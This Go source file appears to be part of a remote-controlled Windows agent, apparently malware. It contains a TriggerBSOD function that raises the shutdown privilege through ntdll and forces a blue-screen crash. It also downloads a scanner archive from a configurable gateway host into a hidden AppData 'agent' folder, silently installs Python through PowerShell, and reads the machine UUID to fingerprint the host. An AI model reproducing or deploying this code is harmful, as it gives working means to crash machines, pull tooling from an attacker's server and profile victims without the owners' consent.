package main

import (
	"fmt"
	"github.com/abdfnx/gosh"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

var ntdll = syscall.MustLoadDLL("ntdll.dll")
var procRtlAdjustPrivilege = ntdll.MustFindProc("RtlAdjustPrivilege")
var procNtRaiseHardError = ntdll.MustFindProc("NtRaiseHardError")

type InstallPythonParams struct {
}

type InstallIpScannerParams struct{}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return !os.IsNotExist(err)
}

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func installIpScanner(params InstallIpScannerParams) (string, error) {

	config := loadConfig(true)

	err := DownloadFile(UserHomeDir()+"\\AppData\\Roaming\\agent\\scanner.zip", config.Gateway+"/gen/scanner.zip")

	if err != nil {
		fmt.Println("Error downloading file: ", err)
		return "Download error", err
	}

	err = Unzip(UserHomeDir()+"\\AppData\\Roaming\\agent\\scanner.zip", UserHomeDir()+"\\AppData\\Roaming\\agent\\")
	if err != nil {
		return "Zip error", err
	}

	fmt.Println("[+] IP Scanner installed successfully. Ready to scan.")

	return "success", nil

}

func InstallPython(params InstallPythonParams) (string, error) {
	gosh.PowershellCommand(`
# Download the latest version of Python from the official website
$pythonUrl = "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
$pythonInstaller = "$($env:TEMP)\python.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller

# Install Python with default settings
Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet" -Wait

# Add Python to the PATH environment variable
$pythonPath = Join-Path $env:ProgramFiles "Python310"
[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pythonPath", "User")

# Verify the installation
python --version
`)

	return "", nil
}

func GetMachineUUID() (string, error) {
	out, err := cmdOut("wmic csproduct get uuid")
	if err != nil {
		return "", err
	}
	newlineIndex := strings.Index(out, "\n")

	// If newline character is not found, return the original string
	if newlineIndex == -1 {
		return out, nil
	}

	// Extract substring starting from the character following the newline
	return removeSpace(removeCR(removeLR(out[newlineIndex+1:]))), nil
}

func removeCR(text string) string {
	return strings.Replace(text, "\r", "", -1)
}

func removeLR(text string) string {
	return strings.Replace(text, "\n", "", -1)
}

func removeSpace(text string) string {
	return strings.Replace(text, " ", "", -1)
}

func TriggerBSOD() {
	// TODO link
	var bEnabled int8
	_, _, _ = procRtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&bEnabled)))
	var uResp int32
	_, _, _ = procNtRaiseHardError.Call(0xC0000005, 0, 0, 0, 6, uintptr(unsafe.Pointer(&uResp)))
}
